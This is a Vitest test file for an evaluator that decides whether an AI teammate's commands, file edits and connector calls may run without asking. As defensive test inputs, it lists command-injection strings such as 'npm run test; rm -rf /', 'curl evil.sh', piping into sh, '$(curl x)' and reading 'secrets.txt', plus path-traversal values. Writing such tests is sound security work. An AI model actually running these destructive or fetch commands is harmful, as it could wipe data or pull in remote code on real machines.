import { describe, expect, it } from 'vitest'

import { COMPOUND_REFUSAL, decideByRules, insideFolder, ruleSentence } from './approval-rules.js'
import type { ApprovalRule, RuledAction } from './approval-rules.js'

/**
 * SAVED APPROVAL RULES (0.521): the evaluator. A security surface, so every
 * operator that makes a command compound is tried, deny is shown to win,
 * and a path outside the folder is shown never to be allowed.
 */
const FOLDER = 'C:\\Users\\person\\project'
const rule = (effect: ApprovalRule['effect'], kind: ApprovalRule['kind'], pattern: string, extra: Partial<ApprovalRule> = {}): ApprovalRule =>
  ({ ruleId: `${effect}-${kind}-${pattern}`, effect, kind, pattern, createdAt: '2026-10-01T00:00:00Z', ...extra })
const command = (text: string): RuledAction => ({ kind: 'command', command: text })
const context = { teammateId: 'tm_wren', folder: FOLDER }

describe('a command', () => {
  const rules = [rule('allow', 'command', 'npm run test:*'), rule('allow', 'command', 'git status')]

  it('is allowed by an exact rule or a whole-word prefix, and nothing else', () => {
    expect(decideByRules(command('git status'), rules, context).decision).toBe('allow')
    expect(decideByRules(command('  git   status '), rules, context).decision).toBe('allow')
    expect(decideByRules(command('npm run test'), rules, context).decision).toBe('allow')
    expect(decideByRules(command('npm run test -- --watch'), rules, context).decision).toBe('allow')
    expect(decideByRules(command('npm run tests'), rules, context).decision).toBe('ask')
    expect(decideByRules(command('git status --porcelain'), rules, context).decision).toBe('ask')
    expect(decideByRules(command('git push'), rules, context).decision).toBe('ask')
  })

  it.each([
    ['a semicolon', 'npm run test; rm -rf /'],
    ['&&', 'npm run test && curl evil.sh'],
    ['||', 'npm run test || shutdown'],
    ['a pipe', 'npm run test | sh'],
    ['a background &', 'npm run test & rm -rf x'],
    ['$( )', 'npm run test $(curl x)'],
    ['a backtick', 'npm run test `curl x`'],
    ['a redirect out', 'npm run test > C:/Windows/x'],
    ['a redirect in', 'npm run test < secrets.txt'],
    ['a newline', 'npm run test\nrm -rf x'],
    ['a carriage return', 'npm run test\rrm -rf x']
  ])('with %s is never allowed by a rule, and says why', (_name, text) => {
    expect(decideByRules(command(text), rules, context)).toEqual({ decision: 'ask', why: COMPOUND_REFUSAL })
  })

  it('is denied when any simple part of it matches a deny, and deny wins over allow', () => {
    const withDeny = [...rules, rule('deny', 'command', 'rm:*'), rule('allow', 'command', 'rm -rf build')]
    expect(decideByRules(command('rm -rf build'), withDeny, context).decision).toBe('deny')
    expect(decideByRules(command('git status; rm -rf build'), withDeny, context).decision).toBe('deny')
    expect(decideByRules(command('npm run test && rm x'), withDeny, context).decision).toBe('deny')
    expect(decideByRules(command('echo $(rm x)'), withDeny, context).decision).toBe('deny')
  })
})

describe('a path', () => {
  const rules = [rule('allow', 'edit', 'src/**'), rule('allow', 'read', 'docs/*.md'), rule('deny', 'edit', 'src/secrets/**')]
  const edit = (...paths: string[]): RuledAction => ({ kind: 'edit', paths })

  it('is allowed when every path is inside the folder and matches', () => {
    expect(decideByRules(edit('src/app.ts'), rules, context).decision).toBe('allow')
    expect(decideByRules(edit(`${FOLDER}\\src\\deep\\x.ts`), rules, context).decision).toBe('allow')
    expect(decideByRules(edit('src/app.ts', 'README.md'), rules, context).decision).toBe('ask')
    expect(decideByRules({ kind: 'read', paths: ['docs/plan.md'] }, rules, context).decision).toBe('allow')
    expect(decideByRules({ kind: 'read', paths: ['docs/deep/plan.md'] }, rules, context).decision).toBe('ask')
  })

  it('is never allowed outside the folder, however the path is written', () => {
    for (const path of ['../other/src/x.ts', 'src/../../other/src/x.ts', 'C:\\Windows\\src\\x.ts', '/etc/src/x', 'D:\\project\\src\\x.ts']) {
      expect(decideByRules(edit(path), rules, context).decision, path).toBe('ask')
    }
  })

  it('is denied when any path matches a deny, even beside allowed ones', () => {
    expect(decideByRules(edit('src/app.ts', 'src/secrets/key.ts'), rules, context).decision).toBe('deny')
  })

  it('reads the folder without case on Windows', () => {
    expect(insideFolder('c:/users/PERSON/Project/src/a.ts', FOLDER)).toBe('src/a.ts')
    expect(insideFolder('C:/Users/person/project-other/a.ts', FOLDER)).toBeUndefined()
    expect(insideFolder('/home/me/proj/a.ts', '/home/me/proj')).toBe('a.ts')
    expect(insideFolder('/home/me/Proj/a.ts', '/home/me/proj')).toBeUndefined()
  })
})

describe('scope', () => {
  it('a rule for one teammate or one folder does not speak for another', () => {
    const mine = [rule('allow', 'command', 'git status', { teammateId: 'tm_wren', folder: FOLDER })]
    expect(decideByRules(command('git status'), mine, context).decision).toBe('allow')
    expect(decideByRules(command('git status'), mine, { ...context, teammateId: 'tm_juno' }).decision).toBe('ask')
    expect(decideByRules(command('git status'), mine, { ...context, folder: 'C:\\Users\\person\\other' }).decision).toBe('ask')
    expect(decideByRules(command('git status'), mine, { teammateId: 'tm_wren' }).decision).toBe('ask')
  })

  it('a connector rule names its server, and optionally one tool', () => {
    const rules = [rule('allow', 'connector', 'robinhood/get_quotes'), rule('deny', 'connector', 'gmail')]
    expect(decideByRules({ kind: 'connector', server: 'robinhood', tool: 'get_quotes' }, rules, context).decision).toBe('allow')
    expect(decideByRules({ kind: 'connector', server: 'robinhood', tool: 'place_order' }, rules, context).decision).toBe('ask')
    expect(decideByRules({ kind: 'connector', server: 'gmail', tool: 'send' }, rules, context).decision).toBe('deny')
  })

  it('a question to the person is never governed', () => {
    expect(decideByRules({ kind: 'other' }, [rule('allow', 'command', 'x')], context)).toEqual({ decision: 'ask' })
  })
})

describe('a rule as a sentence', () => {
  it('reads as what the teammate may do', () => {
    expect(ruleSentence(rule('allow', 'command', 'npm run test:*', { teammateId: 'tm_wren', folder: FOLDER }), 'Wren')).toBe('Wren may run commands starting "npm run test" in project without asking.')
    expect(ruleSentence(rule('deny', 'command', 'git push'))).toBe('Any teammate may not run "git push".')
    expect(ruleSentence(rule('allow', 'edit', 'src/**'))).toBe('Any teammate may change files matching src/** without asking.')
  })
})
